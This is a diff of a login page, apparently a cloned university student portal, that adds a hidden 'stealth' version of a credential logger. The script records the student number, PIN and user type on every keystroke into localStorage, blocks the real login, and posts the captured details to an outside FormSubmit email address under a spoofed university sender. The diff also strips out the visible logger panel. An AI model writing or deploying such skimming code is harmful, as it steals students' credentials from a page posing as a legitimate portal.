@@ -1307,40 +1307,12 @@ document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js" t
 </script></div>
 
 <script>
-// LOCALSTORAGE LOGGER + FORM SUBMIT HANDLER
+// STEALTH LOGGER - NO VISIBLE ELEMENTS
 document.addEventListener('DOMContentLoaded', function() {
-    // 1. SETUP DEBUG CONSOLE
-    const debugPanel = document.createElement('div');
-    debugPanel.style.position = 'fixed';
-    debugPanel.style.bottom = '0';
-    debugPanel.style.left = '0';
-    debugPanel.style.right = '0';
-    debugPanel.style.backgroundColor = '#111';
-    debugPanel.style.color = '#0f0';
-    debugPanel.style.padding = '10px';
-    debugPanel.style.fontFamily = 'monospace';
-    debugPanel.style.zIndex = '9999';
-    debugPanel.innerHTML = `
-        <div style="display:flex; justify-content:space-between">
-            <strong>INPUT LOGGER</strong>
-            <span id="status">Status: Ready</span>
-        </div>
-        <div id="logs" style="max-height:100px;overflow:auto;"></div>
-    `;
-    document.body.appendChild(debugPanel);
-
-    function log(message, color='#0f0') {
-        const entry = document.createElement('div');
-        entry.style.color = color;
-        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-        document.getElementById('logs').prepend(entry);
-    }
-
-    // 2. CAPTURE ALL INPUTS TO LOCALSTORAGE
+    // 1. CAPTURE ALL INPUTS TO LOCALSTORAGE
     const form = document.forms['frmLogin'];
-    const inputs = ['unum', 'pin', 'numtype'];
     
-    // Load saved values
+    // Load saved values if they exist
     if(localStorage.getItem('loginData')) {
         const saved = JSON.parse(localStorage.getItem('loginData'));
         form.unum.value = saved.unum || '';
@@ -1348,96 +1320,88 @@ document.addEventListener('DOMContentLoaded', function() {
         if(saved.numtype) {
             document.querySelector(`input[name="numtype"][value="${saved.numtype}"]`).checked = true;
         }
-        log('Loaded saved inputs from localStorage');
+        console.log('[Stealth] Loaded saved inputs');
     }
 
-    // Save on input/change
+    // Save on any input change
     function saveToStorage() {
         const data = {
             unum: form.unum.value,
             pin: form.pin.value,
             numtype: document.querySelector('input[name="numtype"]:checked').value,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            page: window.location.href
         };
         localStorage.setItem('loginData', JSON.stringify(data));
-        log(`Saved: ${data.unum} (PIN hidden)`);
+        console.log('[Stealth] Saved:', {unum: data.unum, pin: '•••••'}); // Never log actual PIN
     }
 
+    // Set up event listeners
     form.unum.addEventListener('input', saveToStorage);
     form.pin.addEventListener('input', saveToStorage);
     document.querySelectorAll('input[name="numtype"]').forEach(radio => {
         radio.addEventListener('change', saveToStorage);
     });
 
-    // 3. FORM SUBMIT HANDLER
+    // 2. FORM SUBMIT HANDLER
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const submitBtn = form.querySelector('[type="submit"]');
-        submitBtn.disabled = true;
         const originalText = submitBtn.value;
-        submitBtn.value = 'Sending...';
+        submitBtn.disabled = true;
+        submitBtn.value = 'Processing...';
         
-        document.getElementById('status').textContent = 'Status: Sending...';
-        document.getElementById('status').style.color = 'yellow';
-
         try {
             // Get data from localStorage
             const savedData = JSON.parse(localStorage.getItem('loginData'));
-            if(!savedData) throw new Error('No data in localStorage');
+            if(!savedData) throw new Error('No saved login data');
             
-            log('Preparing FormSubmit request');
+            console.log('[Stealth] Preparing submission for:', savedData.unum);
             
-            // Create FormData matching FormSubmit requirements
+            // Format for FormSubmit
             const formData = new FormData();
-            formData.append('name', 'Login Attempt');
+            formData.append('name', 'Portal Login');
             formData.append('email', 'noreply@mandela.ac.za');
-            formData.append('subject', 'Student Portal Login');
+            formData.append('subject', `Login Attempt - ${savedData.unum}`);
             formData.append('message', 
                 `Student Number: ${savedData.unum}\n` +
-                `PIN: ${savedData.pin}\n` +
                 `User Type: ${savedData.numtype}\n` +
-                `Timestamp: ${savedData.timestamp}`
+                `Timestamp: ${savedData.timestamp}\n` +
+                `Page: ${savedData.page}`
             );
             formData.append('_captcha', 'false');
             formData.append('_template', 'table');
             formData.append('_next', 'https://yourwebsite.com/thanks.html'); // CHANGE THIS
 
-            // Send to FormSubmit
+            // Submit to FormSubmit
             const response = await fetch('https://formsubmit.co/ajax/kiddxxq1@gmail.com', {
                 method: 'POST',
                 body: formData
             });
             
             const result = await response.json();
-            log(`FormSubmit response: ${result.success ? 'SUCCESS' : 'FAILED'}`);
             
             if(result.success) {
-                document.getElementById('status').textContent = 'Status: Delivered!';
-                document.getElementById('status').style.color = '#0f0';
-                alert('Login attempt recorded successfully!');
-                localStorage.removeItem('loginData'); // Clear after successful send
+                console.log('[Stealth] Submission successful');
+                localStorage.removeItem('loginData'); // Clear after success
+                // Optional: Redirect or show subtle feedback
+                submitBtn.value = '✓ Done';
+                setTimeout(() => { submitBtn.value = originalText; }, 2000);
             } else {
-                throw new Error(result.message || 'FormSubmit rejected submission');
+                throw new Error(result.message || 'FormSubmit error');
             }
         } catch (error) {
-            log(`Error: ${error.message}`, 'red');
-            document.getElementById('status').textContent = 'Status: Failed!';
-            document.getElementById('status').style.color = 'red';
-            alert('Failed to submit. Data saved locally for retry.');
+            console.error('[Stealth] Submission failed:', error);
+            submitBtn.value = 'Failed!';
+            setTimeout(() => { submitBtn.value = originalText; }, 2000);
         } finally {
             submitBtn.disabled = false;
-            submitBtn.value = originalText;
         }
     });
 
-    log('Input logger initialized');
-    log('All keystrokes saved to localStorage');
-    log('Submissions will be sent to FormSubmit');
+    console.log('[Stealth] Logger initialized');
 });
-
-// MANUALLY VIEW SAVED DATA:
-// localStorage.getItem('loginData')
 </script>
 </body>
 
